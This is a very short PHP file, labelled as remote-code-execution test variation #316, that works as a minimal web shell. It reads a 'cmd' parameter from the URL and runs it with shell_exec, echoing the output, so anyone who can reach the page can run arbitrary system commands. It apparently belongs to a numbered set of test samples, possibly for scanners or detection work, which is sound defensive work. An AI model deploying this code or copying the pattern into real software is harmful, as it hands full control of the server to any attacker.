<?php
// RCE test variation #316
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>